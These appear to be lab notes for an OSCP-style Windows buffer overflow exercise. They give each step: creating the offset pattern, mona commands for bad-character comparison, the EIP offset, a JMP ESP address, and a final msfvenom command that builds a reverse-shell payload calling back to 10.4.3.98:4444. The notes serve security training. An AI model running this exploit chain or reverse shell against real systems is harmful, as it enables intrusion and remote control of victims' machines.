### Find EIP and offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l crashbytes+400

!mona config -set workingfolder c:\mona

Log data, item 19
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x6f43396e (offset 1978)

### Bad chars
#### Round 1
ESP 018AFA30

!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
!mona compare -f C:\mona\oscp\bytearray.bin -a 018AFA30


07 08 2e 2f a0 a1

!mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"
!mona bytearray -b "\x00\x07\x2e\xa0"


#### Round 2
ESP 0198FA30

!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
Unmodified got it

### Finding a Jump Point
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

625011AF
\xaf\x11\x50\x62

### Generate Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c